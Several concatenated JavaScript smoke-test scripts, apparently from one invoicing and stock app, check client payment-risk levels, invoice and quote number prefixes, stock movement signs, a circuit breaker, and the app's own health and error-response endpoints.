function clientRisk(invoices, clientId, clientName) {
  const hasId = clientId !== undefined && clientId !== null && clientId !== '';
  const hasName = !!(clientName && String(clientName).trim());
  if (!hasId && !hasName) {
    return { level: 'ok', message: '', unpaid: 0, overdue: 0 };
  }
  const now = Date.now();
  let unpaid = 0;
  let overdue = 0;
  for (const inv of invoices || []) {
    if (['quote', 'devis', 'cancelled', 'remboursement'].includes(String(inv.status))) continue;
    if (hasId && Number(inv.client_id) !== Number(clientId)) continue;
    if (!hasId && hasName && norm(inv.client_name || '') !== norm(clientName || '')) continue;
    const due = Math.max(0, Number(inv.total || 0) - Number(inv.amount_paid || 0));
    if (due < 0.01) continue;
    unpaid += due;
    const d = inv.due_date || inv.issue_date;
    if (d && new Date(d).getTime() < now - 86400000) overdue += due;
  }
  if (overdue > 0) return { level: 'high', message: 'overdue', unpaid, overdue };
  if (unpaid > 5000) return { level: 'watch', message: 'watch', unpaid, overdue };
  return { level: 'ok', message: '', unpaid, overdue };
}

const invoices = [
  { status: 'sent', client_id: 1, client_name: 'A', total: 1400, amount_paid: 0, due_date: '2020-01-01' },
];
const empty = clientRisk(invoices, '', '');
if (empty.level !== 'ok') {
  console.error('FAIL: empty client should be ok', empty);
  process.exit(1);
}
const high = clientRisk(invoices, 1, 'A');
if (high.level !== 'high') {
  console.error('FAIL: client 1 should be high', high);
  process.exit(1);
}
console.log('smoke-client-risk: OK');

function isQuickSaleBody(body) {
  return !!(body.quick_sale === true || body.doc_kind === 'quick_sale' || body.doc_kind === 'ticket');
}
function expectedKind(body) {
  if (body.status === 'quote' || body.status === 'devis') return 'quote';
  if (isQuickSaleBody(body)) return 'quick_sale';
  return 'invoice';
}
function expectedPrefix(kind) {
  return { quote: 'DEV-', quick_sale: 'VR-', invoice: 'FA-' }[kind];
}

const cases = [
  [{ status: 'sent', items: [{ name: 'x', quantity: 1, unit_price: 10 }], client_name: 'A' }, 'invoice', 'FA-'],
  [{ status: 'sent', quick_sale: true, items: [{ name: 'x', quantity: 1, unit_price: 10 }], client_name: 'A' }, 'quick_sale', 'VR-'],
  [{ status: 'quote', items: [{ name: 'x', quantity: 1, unit_price: 10 }], client_name: 'A' }, 'quote', 'DEV-'],
  [{ doc_kind: 'ticket', status: 'sent', items: [{ name: 'x', quantity: 1, unit_price: 10 }], client_name: 'A' }, 'quick_sale', 'VR-'],
];

let failed = 0;
for (const [body, kind, prefix] of cases) {
  const k = expectedKind(body);
  const p = expectedPrefix(k);
  if (k !== kind || p !== prefix) {
    console.error('FAIL', body, 'got', k, p, 'want', kind, prefix);
    failed++;
  }
}
if (failed) process.exit(1);

/**
 * Offline smoke: FA/VR/DEV prefixes, EMP pad, stock movement sign.
 * Run: node scripts/smoke-numbering-stock.mjs
 */

function docKind(body) {
  if (body.status === 'quote' || body.status === 'devis') return 'quote';
  if (body.quick_sale === true || body.doc_kind === 'quick_sale' || body.doc_kind === 'ticket') return 'quick_sale';
  return 'invoice';
}
function prefix(kind) {
  return { quote: 'DEV-', quick_sale: 'VR-', invoice: 'FA-' }[kind];
}
function formatEmp(n, pad = 4, pfx = 'EMP-') {
  return `${pfx}${String(Math.max(1, n)).padStart(pad, '0')}`;
}
/** Stock delta for movement type */
function stockDelta(type, qty) {
  const q = Math.abs(Number(qty) || 0);
  if (type === 'in' || type === 'receive' || type === 'purchase') return q;
  if (type === 'out' || type === 'sale' || type === 'damage') return -q;
  if (type === 'adjust') return Number(qty) || 0;
  return 0;
}

let failed = 0;
function ok(cond, msg) {
  if (!cond) {
    console.error('FAIL', msg);
    failed++;
  }
}

ok(prefix(docKind({ status: 'sent' })) === 'FA-', 'FA default');
ok(prefix(docKind({ status: 'sent', quick_sale: true })) === 'VR-', 'VR quick_sale');
ok(prefix(docKind({ status: 'quote' })) === 'DEV-', 'DEV quote');
ok(formatEmp(1) === 'EMP-0001', 'EMP pad');
ok(formatEmp(42, 4) === 'EMP-0042', 'EMP 42');
ok(stockDelta('sale', 3) === -3, 'sale outbound');
ok(stockDelta('receive', 5) === 5, 'receive inbound');
ok(stockDelta('adjust', -2) === -2, 'adjust signed');

// Circuit breaker pure logic mirror
const fails = { n: 0, open: false };
function cbFail(th = 5) {
  fails.n++;
  if (fails.n >= th) fails.open = true;
}
function cbOk() {
  fails.n = 0;
  fails.open = false;
}
for (let i = 0; i < 5; i++) cbFail();
ok(fails.open === true, 'circuit opens after threshold');
cbOk();
ok(fails.open === false, 'circuit closes on success');

if (failed) {
  console.error(`smoke-numbering-stock: ${failed} failure(s)`);
  process.exit(1);
}
console.log('smoke-numbering-stock: OK');

/**
 * P0 smoke: health + public API error shape.
 * Default base: ATLAS_SMOKE_BASE or https://stock.afmarbre.com (wrangler dev).
 * If nothing listens → skip (exit 0) unless ATLAS_SMOKE_REQUIRE=1.
 *
 *   npx wrangler dev   # terminal 1
 *   npm run smoke      # terminal 2
 *   ATLAS_SMOKE_BASE=https://stock.afmarbre.com npm run smoke
 */
const base = (process.argv[2] || process.env.ATLAS_SMOKE_BASE || 'https://stock.afmarbre.com').replace(/\/$/, '');
const requireLive = process.env.ATLAS_SMOKE_REQUIRE === '1' || process.env.ATLAS_SMOKE_REQUIRE === 'true';

async function get(path) {
  const res = await fetch(`${base}${path}`, {
    headers: { Accept: 'application/json' },
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* */
  }
  return { res, json, text };
}

function isConnRefused(err) {
  const msg = String(err?.message || err || '');
  const cause = err?.cause;
  const code = cause?.code || err?.code || '';
  return (
    code === 'ECONNREFUSED' ||
    code === 'ENOTFOUND' ||
    code === 'EAI_AGAIN' ||
    /fetch failed/i.test(msg) ||
    /ECONNREFUSED/i.test(msg)
  );
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg);
}

// Probe
try {
  await get('/api/health');
} catch (e) {
  if (isConnRefused(e) && !requireLive) {
    console.log(`skip P0 API smoke — no server at ${base} (start: npx wrangler dev)`);
    console.log('     or set ATLAS_SMOKE_BASE=https://your-deployed-host');
    process.exit(0);
  }
  console.error('fail /api/health', e.message);
  process.exit(1);
}

const failures = [];

try {
  const h = await get('/api/health');
  assert(h.res.ok, `health status ${h.res.status}`);
  assert(h.json && typeof h.json === 'object', 'health body not json');
  console.log('ok  /api/health');
} catch (e) {
  failures.push(`health: ${e.message}`);
  console.error('fail /api/health', e.message);
}

try {
  const g = await get('/api/public/github-profile');
  assert(g.json && typeof g.json.success === 'boolean', 'github-profile missing success');
  console.log('ok  /api/public/github-profile success=', g.json.success);
} catch (e) {
  failures.push(`github-profile: ${e.message}`);
  console.error('fail /api/public/github-profile', e.message);
}

try {
  const missing = await get('/api/this-route-should-not-exist-p0');
  if (missing.json && typeof missing.json === 'object') {
    if (missing.json.success === false) {
      console.log('ok  unknown route JSON fail shape');
    } else {
      console.log('skip unknown route (success body)');
    }
  } else {
    console.log('skip unknown route (non-json)', missing.res?.status);
  }
} catch (e) {
  failures.push(`unknown: ${e.message}`);
}

if (failures.length) {
  console.error('\nP0 smoke failed:\n', failures.join('\n'));
  process.exit(1);
}
console.log('\nP0 API shape smoke passed against', base);

  res = await fetch(`${base}/api/v1/health`, { headers });
